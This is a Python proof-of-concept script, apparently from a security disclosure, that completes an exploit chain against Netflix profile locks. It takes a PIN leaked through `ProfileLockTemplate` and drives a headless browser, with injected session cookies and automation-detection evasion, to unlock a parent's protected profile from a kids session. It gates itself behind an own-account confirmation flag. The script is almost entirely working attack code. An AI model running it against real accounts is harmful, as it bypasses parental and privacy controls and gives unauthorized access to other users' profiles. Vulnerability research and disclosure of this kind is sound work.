#!/usr/bin/env python3
"""Use a PIN disclosed by `ProfileLockTemplate` to open the protected profile.

This is the last step of the chain and the only one that touches UI:

    kids session -> read parent's PIN -> /ProfilesGate -> select protected tile
                 -> enter PIN -> session becomes that profile -> /browse

It refuses to run unless the PIN is passed explicitly and --confirm-own-account
is set, and it prints the `pg` value before and after so the transition is the
evidence rather than a claim.

    python3 poc/unlock_with_pin.py \
        --cookies cookies-kids.txt --target <protected-guid> \
        --pin 0000 --confirm-own-account
"""
import argparse
import asyncio
import sys

import profiles
from playwright.async_api import async_playwright

PROMPT_FIELDS = ('input[inputmode="numeric"]', 'input[type="tel"]',
                 'input[type="password"]', 'input[name="pin"]')
SUBMIT = ('button:has-text("Unlock")', 'button:has-text("Continue")',
          'button:has-text("Submit")', 'button[type="submit"]')


async def main(args):
    async with async_playwright() as p:
        ctx = await p.chromium.launch_persistent_context(
            args.profile_dir, executable_path=profiles.CHROME, headless=not args.headed,
            args=["--no-sandbox", "--disable-blink-features=AutomationControlled"])
        page = ctx.pages[0] if ctx.pages else await ctx.new_page()
        await ctx.add_cookies(profiles.parse_cookies(profiles.read_cookie_file(args.cookies)))

        print(f"[start] pg={profiles.pg_of(await ctx.cookies())}")
        await page.goto("https://www.netflix.com/ProfilesGate",
                        wait_until="domcontentloaded", timeout=60000)
        await page.wait_for_timeout(3000)

        tile = f'[data-uia="profile-selector+tile-{args.target}"]'
        if not await page.locator(tile).count():
            sys.exit(f"profile tile for {args.target} not found on the gate")
        await page.locator(tile).first.click(timeout=8000)
        await page.wait_for_timeout(3500)

        field = next((s for s in PROMPT_FIELDS if await page.locator(s).count()), None)
        print(f"[gate ] PIN prompt visible: {bool(field)}")
        if not field:
            sys.exit("no PIN prompt -- the tile is not locked, or the gate changed")

        await page.locator(field).first.fill(args.pin)
        for sel in SUBMIT:
            if await page.locator(sel).count():
                try:
                    await page.locator(sel).first.click(timeout=5000)
                    break
                except Exception:
                    pass
        await page.wait_for_timeout(6000)

        final = profiles.pg_of(await ctx.cookies())
        print(f"[final] pg={final} url={page.url} title={await page.title()}")
        ok = final == args.target
        print("RESULT:", "UNLOCKED" if ok else "BLOCKED")
        await ctx.close()
        return 0 if ok else 1


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--cookies", required=True, help="session on a NON-protected profile")
    ap.add_argument("--target", required=True, help="GUID of the PIN-locked profile")
    ap.add_argument("--pin", required=True, help="PIN returned by ProfileLockTemplate")
    ap.add_argument("--profile-dir", default="/tmp/netflix-lockpin-unlock")
    ap.add_argument("--headed", action="store_true")
    ap.add_argument("--confirm-own-account", action="store_true")
    parsed = ap.parse_args()
    profiles.require_own_account(parsed.confirm_own_account)
    sys.exit(asyncio.run(main(parsed)))
